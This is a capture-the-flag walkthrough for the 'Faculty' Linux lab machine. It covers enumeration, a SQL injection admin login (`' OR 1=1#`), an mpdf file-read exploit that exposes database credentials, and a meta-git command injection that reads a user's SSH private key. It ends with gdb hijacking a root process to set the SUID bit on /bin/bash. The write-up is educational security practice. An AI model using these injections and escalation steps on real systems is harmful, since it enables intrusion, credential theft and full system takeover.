# Faculty
### Linux Box

##### Start with an `nmap` scan that shows open ports 22 and 80. Heading over to port 80 we find a login page.

![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FtpBc3ngEj5mgbNZW914Q%2Fimage.png?alt=media&token=7fba467f-3ef9-4a6f-a159-03292b099278 "nmap results")

##### The login page was vulnerable to SQLi, but I couldn't extract any useful information. Next, I tried ffuf to enumerate directories and subdomains.
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.faculty.htb" -u http://faculty.htb -mc 200
```
##### No subdomains but I found the `/admin/login` page. I was able to login with `' OR 1=1#` as the username.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FCg6itFHlBhhiOALJZP5r%2Fimage.png?alt=media&token=30dde0de-b2e9-4fe5-b80f-27395a94e1c5 "admin login")

##### I downloaded a pdf I found on the admin panel. I found the app was using mpdf. Using searchsploit, I found multiple vulnerabilites
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FprphWunbnrSB9vY4M32D%2Fimage.png?alt=media&token=5b78ff0c-0b6f-46b8-a589-bf2323480d49 "searchsploit results")

##### Using the exploit, I was able to grab a few files from the server. I found credentials for the user `gbyolo` in the `db_connect.php` file.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FvWeeHIjZNECM0EfQsnv0%2Fimage.png?alt=media&token=da855f14-a017-4844-bcf0-9be0d54d9222 "db_connect.php")

##### ssh into `gbyolo` using the found credentials
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F33r9Xst9PFRyqnpjHyjG%2Fimage.png?alt=media&token=8be8d48b-6f5d-4748-9af7-8dcc7a9c08d0 "foothold")

##### In `/var/mail` I found a file titled `gbyolo`. It says that `gbyolo` can manage git repositories belonging to the faculty group. I also run `sudo -l`, with the found password, to see what sudo permissions gbyolo has.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F33r9Xst9PFRyqnpjHyjG%2Fimage.png?alt=media&token=8be8d48b-6f5d-4748-9af7-8dcc7a9c08d0 "gbyolo file")

[This hackerone report was helpfull for the next step](https://hackerone.com/reports/728040)

##### Using that exploit, run `sudo -u developer meta-git clone 'sss | cat ~/.ssh/id_rsa'`
[alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FsKtY25lSommhunlw5kUf%2Fimage.png?alt=media&token=a33d4792-104b-44c8-8630-6ca691890b69 "id_rsa")

##### ssh into the developer account after giving `id_rsa` proper permissions. `chmod 600 id_rsa`
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FsUcm3E1PKy2j5hmiQXGB%2Fimage.png?alt=media&token=1edbae46-cb9c-4cc2-ae96-fb8cee137222 "kick some shell")

##### Run linpeas on the target for easy enumeration
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2FUb7VQxgMw9z7rt8zbwr1%2Fimage.png?alt=media&token=3c5cfccc-1b1a-4ba6-b069-4362f6be46e4 "linpeas output")

##### You can also run `ps aux | grep root | grep python3`

##### Use gdb to hijack the process

```gbd
(gbd) call (void)system("chmod u+s /bin/bash")
(gbd) quit
```
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fy8s2zVHMWg1AbBm8ZLN3%2Fuploads%2F048527wX5mSLyoBItEyP%2Fimage.png?alt=media&token=42836c41-2e64-4fe5-ae62-479f06cab3ee "gbd")




